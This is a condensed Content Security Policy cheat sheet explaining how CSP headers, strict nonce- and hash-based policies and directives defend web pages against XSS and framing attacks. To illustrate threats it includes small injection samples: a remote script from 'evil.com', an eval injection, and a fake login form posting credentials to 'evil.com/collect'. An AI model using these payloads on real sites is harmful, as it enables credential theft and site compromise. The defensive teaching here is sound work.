# Content Security Policy Cheat Sheet

## Introduction

Integrates __defense in depth__ into web app client side. Server injects Content-Security-Policy (CSP) headers → browser can protect user from dynamic calls loading content into current page.

## Context

Rising XSS (Cross-Site Scripting), clickjacking, cross-site leak vulnerabilities demand more __defense in depth__.

### Defense against XSS

CSP defends vs XSS:

#### 1. Restricting Inline Scripts

Preventing inline script execution defeats injection like

```html
<script>document.body.innerHTML='defaced'</script>
```

 .

#### 2. Restricting Remote Scripts

Preventing script loading from arbitrary servers defeats injection like

```html
<script src="https://evil.com/hacked.js"></script>
```

.

#### 3. Restricting Unsafe JavaScript

Preventing text-to-JavaScript functions like `eval` protects vs vulnerabilities like:

```js
// A Simple Calculator
var op1 = getUrlParameter("op1");
var op2 = getUrlParameter("op2");
var sum = eval(`${op1} + ${op2}`);
console.log(`The sum is: ${sum}`);
```

#### 4. Restricting Form submissions

Restricting where HTML forms can submit data defeats injected phishing forms:

```html
<form method="POST" action="https://evil.com/collect">
<h3>Session expired! Please login again.</h3>
<label>Username</label>
<input type="text" name="username"/>

<label>Password</label>
<input type="password" name="pass"/>

<input type="Submit" value="Login"/>
</form>
```

#### 5. Restricting Objects

Restricting HTML object tag stops attacker injecting malicious flash/Java/other legacy executables.

### Defense against framing attacks

Clickjacking and some browser side-channel attack variants (xs-leaks) need malicious website to load target in frame.

Historically `X-Frame-Options` header used; obsoleted by `frame-ancestors` CSP directive.

### Defense in Depth

Strong CSP = effective __second layer__ vs various vulnerabilities, esp. XSS. Doesn't prevent apps *containing* vulnerabilities, but makes them significantly harder to exploit.

Even fully static website w/o user input: CSP can enforce Subresource Integrity (SRI). Helps prevent malicious code loading if third-party site hosting JavaScript files (e.g. analytics scripts) compromised.

CSP __should not__ be sole XSS defense. Still follow good practices per [Cross-Site Scripting Prevention Cheat Sheet](Cross_Site_Scripting_Prevention.md); deploy CSP on top as bonus layer.

## Policy Delivery

Three ways to deliver CSP.

### 1. Content-Security-Policy Header

Send Content-Security-Policy HTTP response header from web server.

```text
Content-Security-Policy: ...
```

Preferred; supports full CSP feature set. Send in all HTTP responses, not just index page.

W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+

### 2. Content-Security-Policy-Report-Only Header

`Content-Security-Policy-Report-Only` delivers CSP that isn't enforced.

```text
Content-Security-Policy-Report-Only: ...
```

Violation reports still printed to console and delivered to violation endpoint if `report-to` and `report-uri` directives used.

Also W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+; policy non-blocking ("fail open"), report sent to URL designated by `report-uri` (or newer `report-to`) directive. Often precursor to CSP in blocking mode ("fail closed")

Browsers fully support using `Content-Security-Policy` and `Content-Security-Policy-Report-Only` together. E.g. strict `Report-Only` policy (many violation reports) plus looser enforced policy (avoid breaking legitimate functionality).

### 3. Content-Security-Policy Meta Tag

When header unusable, e.g., HTML files deployed in CDN w/ headers out of your control.

Specify `http-equiv` meta tag in HTML markup:

```html
<meta http-equiv="Content-Security-Policy" content="...">
```

Almost everything still supported, incl. full XSS defenses. Can't use framing protections, sandboxing, or CSP violation logging endpoint.

### WARNING

__DO NOT__ use `X-Content-Security-Policy` or `X-WebKit-CSP`. Implementations obsolete (since Firefox 23, Chrome 25), limited, inconsistent, incredibly buggy.

## CSP Types (granular/allowlist based or strict)

Original research on allowlist weaknesses: CSP Is Dead, Long Live CSP!.

Original mechanism: allow-lists defining permitted content and sources in HTML page context.

Current leading practice: "Strict" CSP; much easier to deploy, more secure (less likely bypassed).

## Strict CSP

Create strict CSP using limited number of granular [Fetch Directives listed below](#fetch-directives) plus one of two mechanisms:

- Nonce based
- Hash based

`strict-dynamic` directive optionally eases Strict CSP implementation.

Sections give basic guidance; strongly recommended to follow Google's detailed methodological instructions:

__Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CSP)__

### Nonce based

Nonces = unique one-time-use random values generated per HTTP response, added to Content-Security-Policy header:

```js
const nonce = uuid.v4();
scriptSrc += ` 'nonce-${nonce}'`;
```

Pass nonce to view (nonces require non-static HTML), render script tags like:

```html
<script nonce="<%= nonce %>">
    ...
</script>
```

#### Warning

__Don't__ create middleware replacing all script tags with "script nonce=...": attacker-injected scripts get nonces too. Need actual HTML templating engine to use nonces.

### Hashes

Inline scripts required: `script-src 'hash_algo-hash'` allows only specific scripts to execute.

```text
Content-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='
```

Get hash from Google Chrome developer tools violations like:

> ❌ Refused to execute inline script because it violates the following Content Security Policy directive: "..." Either the 'unsafe-inline' keyword, a hash (__'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='__), or a nonce...

Can also use hash generator (report-uri.com). Example of hashes: csp.withgoogle.com FAQ static content.

#### Note

Hashes risky. Change *anything* inside script tag (even whitespace), e.g. formatting code → hash differs, script won't render.

### strict-dynamic

`strict-dynamic` used in Strict CSP w/ hashes or nonces.

Script block with correct hash or nonce creating additional DOM elements and executing JS in them: `strict-dynamic` tells browser to trust those elements too w/o explicit nonces or hashes for each.

`strict-dynamic` = CSP level 3 feature; CSP level 3 very widely supported in common, modern browsers.

More: strict-dynamic usage (W3C CSP spec).

## Detailed CSP Directives

Multiple directive types give granular policy flow control. Non-Strict policy too granular or permissive likely leads to bypasses and loss of protection.

### Fetch Directives

Tell browser locations to trust and load resources from.

Most fetch directives have fallback list (W3 CSP3 directive-fallback-list). Allows granular control of source of scripts, images, files, etc.

- `child-src` controls nested browsing contexts and worker execution contexts.
- `connect-src` controls fetch requests, XHR, eventsource, beacon and websockets connections.
- `font-src` URLs to load fonts from.
- `img-src` URLs images can load from.
- `manifest-src` URLs application manifests may load from.
- `media-src` URLs video, audio and text track resources can load from.
- `prefetch-src` was experimental directive for prefetch/prerender resource URLs. __Removed from CSP Level 3 specification__, ignored by modern browsers — don't rely on it for defense. Constrain scripts, styles, default fetches with standard fetch directives instead.
- `object-src` URLs plugins can load from.
- `script-src` locations scripts can execute from. Fallback directive for other script-like directives.
    - `script-src-elem` controls location from which script requests and blocks can execute.
    - `script-src-attr` controls event handler execution.
- `style-src` controls where styles get applied to document. Includes `<link>` elements, `@import` rules, requests originating from `Link` HTTP response header field.
    - `style-src-elem` controls styles except inline attributes.
    - `style-src-attr` controls styles attributes.
- `default-src` fallback directive for other fetch directives. Specified directives have no inheritance; unspecified fall back to `default-src` value.

### Document Directives

Instruct browser on properties of document policies apply to.

- `base-uri` possible URLs `<base>` element can use.
- `plugin-types` removed from CSP specification. Don't rely on it to enforce content types. Use `object-src 'none'` when embedded objects unnecessary, as in [strict policy examples](#strict-policy).
- `sandbox` restricts page actions such as submitting forms.
    - Applies only with request header `Content-Security-Policy`.
    - No value for directive activates all sandbox restrictions. `Content-Security-Policy: sandbox;`
    - Sandbox syntax (MDN)

### Navigation Directives

Instruct browser on locations document can navigate to or be embedded from.

- `form-action` restricts URLs forms can submit to.
- `frame-ancestors` restricts URLs that can embed requested resource inside `<frame>`, `<iframe>`, `<object>`, `<embed>`, or `<applet>` elements.
    - Specified in `<meta>` tag → ignored.
    - Doesn't fall back to `default-src`.
    - `X-Frame-Options` obsolete by this directive, ignored by user agents.

### Reporting Directives

Deliver violations of prevented behaviors to specified locations. Useless alone; depend on other directives.

- `report-to` (CSP Level 3, used with Reporting API) = __primary, current__ reporting directive. References endpoint name defined in Reporting-Endpoints response header, which uses comma-separated `name="URL"` entries. Legacy `Report-To` header uses JSON instead.
    - MDN report-to documentation
- `report-uri` __deprecated__ by CSP Level 3 in favor of `report-to`. Takes URI reports are sent to.
    - Format: `Content-Security-Policy: report-uri https://example.com/csp-reports`

Backward compatibility: declare both directives. Browsers supporting `report-to` use it, ignore `report-uri`; older browsers fall back to `report-uri`. Once legacy browser support not required, remove `report-uri`.

### Special Directive Sources

| Value            | Description                                                                 |
|------------------|-----------------------------------------------------------------------------|
| 'none'           | No URLs match.                                                              |
| 'self'           | Refers to the origin site with the same scheme and port number.             |
| 'unsafe-inline'  | Allows the usage of inline scripts or styles.                               |
| 'unsafe-eval'    | Allows the usage of eval in scripts.                                        |

See W3C source lists for how directive sources work.

## CSP Sample Policies

### Strict Policy

Strict policy protects vs classical stored, reflected, some DOM XSS attacks; optimal goal of any team implementing CSP.

Google's detailed methodological instructions for creating Strict CSP (above). Per those, use one of two policies:

#### Nonce-based Strict Policy

```text
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

#### Hash-based Strict Policy

```text
Content-Security-Policy:
  script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

### Basic non-Strict CSP Policy

Use if Strict Policy not possible; prevents cross-site framing and cross-site form-submissions. Allows resources only from originating domain for all default level directives, no inline scripts/styles.

If app functions with these restrictions: drastically reduced attack surface, works with most modern browsers.

Basic policy assumes:

- All resources hosted by same domain as document.
- No inlines or evals for scripts and style resources.
- No need for other websites to frame website.
- No form-submissions to external websites.

```text
Content-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';
```

Tighten further:

```text
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```

Allows images, scripts, AJAX, CSS from same origin; no other resources load (e.g., object, frame, media, etc.).

### Upgrading insecure requests

Migrating HTTP to HTTPS: directive ensures all requests sent over HTTPS, no fallback to HTTP:

```text
Content-Security-Policy: upgrade-insecure-requests;
```

### Preventing framing attacks (clickjacking, cross-site leaks)

- Prevent all framing:
    - `Content-Security-Policy: frame-ancestors 'none';`
- Allow site itself:
    - `Content-Security-Policy: frame-ancestors 'self';`
- Allow trusted domain:
    - `Content-Security-Policy: frame-ancestors trusted.com;`

### Refactoring inline code

`default-src` or `script-src*` directives active → CSP by default disables JavaScript inline in HTML source, such as:

```javascript
<script>
var foo = "314"
<script>
```

Move inline code to separate JavaScript file; page code becomes:

```javascript
<script src="app.js">
</script>
```

`app.js` contains the `var foo = "314"` code.

Inline restriction also applies to `inline event handlers`; following blocked under CSP:

```html
<button id="button1" onclick="doSomething()">
```

Replace with `addEventListener` calls:

```javascript
document.getElementById("button1").addEventListener('click', doSomething);
```

## References

- W3C Content Security Policy Level 3
- MDN Content-Security-Policy header
- Strict CSP deployment guidance
